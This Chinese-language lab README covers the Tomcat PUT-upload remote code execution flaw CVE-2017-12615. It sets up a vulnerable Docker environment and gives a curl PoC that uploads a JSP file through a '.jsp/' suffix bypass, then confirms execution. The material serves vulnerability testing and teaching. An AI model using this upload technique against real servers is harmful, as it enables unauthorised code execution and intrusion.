## Tomcat 远程代码执行漏洞 (CVE-2017-12615)

### 漏洞信息

 * [Fixed in Apache Tomcat 7.0.81](http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81)
 * [Tomcat代码执行漏洞分析测试(附POC)](https://mp.weixin.qq.com/s/dgWT3Cgf1mQs-IYxeID_Mw)
 
 > 根据测试发现 7.0.81 并未修复完全，可绕过，具体参考下方paper链接

 * [云鼎实验室：Tomcat 远程代码执行漏洞分析（CVE-2017-12615）及补丁 Bypass](https://paper.seebug.org/398/)

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:t_tomcat_1
 ```

2. 启动环境

 ```
$ docker run -d -p 8080:8080 medicean/vulapps:t_tomcat_1
 ```
 > `-p 8080:8080` 前面的 8080 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`

#### PoC

1. 向目标发起 PUT 请求，注意后缀为 `.jsp/`

```
$ curl -X PUT "http://127.0.0.1:8080/123.jsp/" -d '<%out.println("test");%>'
```

2. 然后访问目标地址 `http://127.0.0.1:8080/123.jsp`,  即可看到输出了 `test`


### 参考链接

* [Tomcat代码执行漏洞分析测试(附POC)](https://mp.weixin.qq.com/s/dgWT3Cgf1mQs-IYxeID_Mw)
